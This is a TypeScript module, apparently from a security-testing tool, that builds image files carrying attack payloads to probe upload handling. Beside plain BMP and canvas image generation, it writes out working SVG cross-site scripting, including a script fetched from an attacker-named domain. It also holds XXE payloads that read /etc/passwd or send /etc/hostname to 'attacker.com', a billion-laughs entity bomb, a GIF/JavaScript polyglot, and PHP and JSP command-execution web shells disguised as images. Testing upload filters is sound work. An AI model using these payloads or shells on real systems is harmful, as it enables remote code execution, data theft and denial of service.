import { ImageFormat, GenerationSettings } from '../types';

// Helper to create a basic BMP header
const createBMP = (width: number, height: number, colorHex: string): Uint8Array => {
  const rowSize = Math.floor((24 * width + 31) / 32) * 4;
  const pixelArraySize = rowSize * height;
  const fileSize = 54 + pixelArraySize;

  const buffer = new ArrayBuffer(fileSize);
  const view = new DataView(buffer);

  // BMP Header
  view.setUint8(0, 0x42); // 'B'
  view.setUint8(1, 0x4D); // 'M'
  view.setUint32(2, fileSize, true); // File size
  view.setUint32(6, 0, true); // Reserved
  view.setUint32(10, 54, true); // Offset to pixel data

  // DIB Header (BITMAPINFOHEADER)
  view.setUint32(14, 40, true); // Header size
  view.setInt32(18, width, true); // Width
  view.setInt32(22, height, true); // Height
  view.setUint16(26, 1, true); // Planes
  view.setUint16(28, 24, true); // Bit count (24-bit)
  view.setUint32(30, 0, true); // Compression (BI_RGB)
  view.setUint32(34, pixelArraySize, true); // Image size
  view.setInt32(38, 2835, true); // X pixels per meter
  view.setInt32(42, 2835, true); // Y pixels per meter
  view.setUint32(46, 0, true); // Colors used
  view.setUint32(50, 0, true); // Important colors

  // Pixel Data
  const r = parseInt(colorHex.slice(1, 3), 16);
  const g = parseInt(colorHex.slice(3, 5), 16);
  const b = parseInt(colorHex.slice(5, 7), 16);

  const data = new Uint8Array(buffer);
  let offset = 54;
  for (let y = 0; y < height; y++) {
    for (let x = 0; x < width; x++) {
      // BMP uses BGR format
      data[offset] = b;
      data[offset + 1] = g;
      data[offset + 2] = r;
      offset += 3;
    }
    // Padding
    const padding = rowSize - (width * 3);
    offset += padding;
  }

  return data;
};

// EICAR Standard Anti-Virus Test File String
const EICAR_STRING = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

export const generateCanvasImage = async (settings: GenerationSettings): Promise<Blob> => {
  return new Promise((resolve, reject) => {
    const canvas = document.createElement('canvas');
    canvas.width = settings.width;
    canvas.height = settings.height;
    const ctx = canvas.getContext('2d');
    
    if (!ctx) {
      reject(new Error("Could not get canvas context"));
      return;
    }

    // Background
    ctx.fillStyle = settings.color;
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Text
    if (settings.text) {
      ctx.fillStyle = parseInt(settings.color.replace('#', ''), 16) > 0xffffff / 2 ? '#000000' : '#ffffff';
      
      const fontSize = Math.max(12, Math.floor(settings.width / 10));
      ctx.font = `bold ${fontSize}px sans-serif`;
      ctx.textAlign = 'center';
      ctx.textBaseline = 'middle';
      ctx.fillText(settings.text, settings.width / 2, settings.height / 2);
    }

    if (settings.format === ImageFormat.BMP) {
      const bmpData = createBMP(settings.width, settings.height, settings.color);
      resolve(new Blob([bmpData], { type: 'image/bmp' }));
    } else {
      canvas.toBlob((blob) => {
        if (blob) resolve(blob);
        else reject(new Error("Canvas conversion failed"));
      }, settings.format);
    }
  });
};

export const generateSecuritySVG = (settings: GenerationSettings): Blob => {
  let content = '';
  const { width, height, payloadType } = settings;

  const baseSvgStart = `<svg width="${width}" height="${height}" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">`;
  const rect = `<rect width="100%" height="100%" fill="${settings.color}" />`;
  const text = `<text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="sans-serif" font-size="20" fill="white">${settings.text || 'Security Test'}</text>`;

  switch (payloadType) {
    case 'XSS_ALERT':
      content = `
${baseSvgStart}
  <script type="text/javascript">alert('XSS Test: ${settings.text}');</script>
  ${rect}${text}
</svg>`;
      break;

    case 'XSS_REMOTE':
      content = `
${baseSvgStart}
  <script xlink:href="http://attacker-controlled-domain.com/evil.js" />
  ${rect}${text}
</svg>`;
      break;
    
    case 'XXE_BASIC':
      content = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ELEMENT svg ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>${baseSvgStart}${rect}<text x="50%" y="50%" fill="red" font-size="20">&xxe;</text></svg>`;
      break;

    case 'XXE_OOB':
      content = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfiltrate;]>${baseSvgStart}${rect}<text>XXE OOB</text></svg>`;
      break;

    case 'XXE_BILLION_LAUGHS':
      content = `<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
${baseSvgStart}
 <text x="50" y="50" font-size="20">&lol9;</text>
</svg>`;
      break;

    default:
      content = `${baseSvgStart}${rect}${text}</svg>`;
  }

  return new Blob([content], { type: 'image/svg+xml' });
};

// Generates a JPEG with an injected Comment (COM) segment containing a payload
export const generateJpegWithMetadata = async (settings: GenerationSettings, payload: string): Promise<Blob> => {
    // 1. Generate valid JPEG
    const originalBlob = await generateCanvasImage({ ...settings, format: ImageFormat.JPEG });
    const buffer = await originalBlob.arrayBuffer();
    const data = new Uint8Array(buffer);

    // 2. Locate SOI (FF D8) and Insert COM segment (FF FE)
    const payloadBytes = new TextEncoder().encode(payload);
    const length = payloadBytes.length + 2; 
    const comSegment = new Uint8Array(4 + payloadBytes.length);
    
    comSegment[0] = 0xFF;
    comSegment[1] = 0xFE;
    comSegment[2] = (length >> 8) & 0xFF;
    comSegment[3] = length & 0xFF;
    comSegment.set(payloadBytes, 4);

    const newFile = new Uint8Array(data.length + comSegment.length);
    newFile[0] = data[0]; 
    newFile[1] = data[1]; 
    newFile.set(comSegment, 2);
    newFile.set(data.slice(2), 2 + comSegment.length);

    return new Blob([newFile], { type: 'image/jpeg' });
};

// Generates a GIF that is also valid JavaScript (Polyglot)
export const generateGifPolyglot = (settings: GenerationSettings): Blob => {
  const payload = settings.text || "alert(1)";
  const jsPayload = `*/=1; ${payload};`;
  
  const header = new Uint8Array([
    0x47, 0x49, 0x46, 0x38, 0x39, 0x61, // GIF89a
    0x2A, 0x2F, // Width: 0x2F2A (looks like /*)
    0x90, 0x01, // Height: 400
    0xF7, 0x00, 0x00, // Global Color Table flags
    0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, // Black and white
  ]);
  
  const blobParts = [header];
  blobParts.push(new Uint8Array(256 * 3)); 
  blobParts.push(new TextEncoder().encode(jsPayload));
  
  return new Blob(blobParts, { type: 'image/gif' });
}

// PHP Shell disguised as GIF
export const generatePhpShellGif = (settings: GenerationSettings): Blob => {
    const magic = new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]); // GIF89a
    const shell = new TextEncoder().encode(`\n<?php system($_GET['c']); ?>\n`);
    const junk = new Uint8Array(100).fill(0xCC); // Padding
    
    return new Blob([magic, junk, shell, junk], { type: 'image/gif' });
}

// ASPX Shell disguised as BMP (Polyglot)
export const generateAspxPolyglot = (settings: GenerationSettings): Blob => {
  // BMP Header with "BM" magic bytes
  // "BM" is 0x42 0x4D.
  // ASPX ignores binary garbage before the <%@ %> directive often if configuration allows, 
  // but a safer bet is a plain text file for ASPX. 
  // However, for "Polyglot", let's make it valid BMP header first.
  
  const bmpHeader = createBMP(1, 1, '#000000').slice(0, 54); // Just the header
  const payload = new TextEncoder().encode(`
<%@ Page Language="C#" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.QueryString["cmd"] != null)
        {
            Response.Write("Command Output: " + Request.QueryString["cmd"]);
        }
    }
</script>
<!-- Hex padding for visual spoofing -->
`);

  return new Blob([bmpHeader, payload], { type: 'image/bmp' });
}

// JSP Shell disguised as JPEG (Polyglot-ish) or just raw
export const generateJspPolyglot = (settings: GenerationSettings): Blob => {
  // Standard JSP Shell
  const payload = `
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd"));
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr); 
    disr = dis.readLine(); 
    }
}
%>
<!-- Hidden in Image -->
`;
  return new Blob([payload], { type: 'application/x-jsp' });
}

export const generateAnomaly = async (settings: GenerationSettings): Promise<Blob> => {
  const { anomalyType, width, height, color } = settings;

  if (anomalyType === 'FAKE_HUGE') {
    const tinyBMP = createBMP(1, 1, color);
    const view = new DataView(tinyBMP.buffer);
    view.setInt32(18, 50000, true); 
    view.setInt32(22, 50000, true); 
    return new Blob([tinyBMP], { type: 'image/bmp' });
  }

  if (anomalyType === 'EICAR_APPEND') {
    const validImage = await generateCanvasImage({ ...settings, format: ImageFormat.JPEG });
    const buffer = await validImage.arrayBuffer();
    const combined = new Uint8Array(buffer.byteLength + EICAR_STRING.length);
    combined.set(new Uint8Array(buffer), 0);
    combined.set(new TextEncoder().encode(EICAR_STRING), buffer.byteLength);
    return new Blob([combined], { type: 'image/jpeg' });
  }

  if (anomalyType === 'TRUNCATED_FILE') {
    const validImage = await generateCanvasImage({ ...settings, format: ImageFormat.JPEG });
    const buffer = await validImage.arrayBuffer();
    const sliced = buffer.slice(0, Math.floor(buffer.byteLength * 0.2));
    return new Blob([sliced], { type: 'image/jpeg' });
  }

  if (anomalyType === 'GARBAGE_CONTENT') {
    const size = 1024 * 5; 
    const buffer = new Uint8Array(size);
    crypto.getRandomValues(buffer);
    return new Blob([buffer], { type: 'application/octet-stream' });
  }

  return generateCanvasImage(settings);
};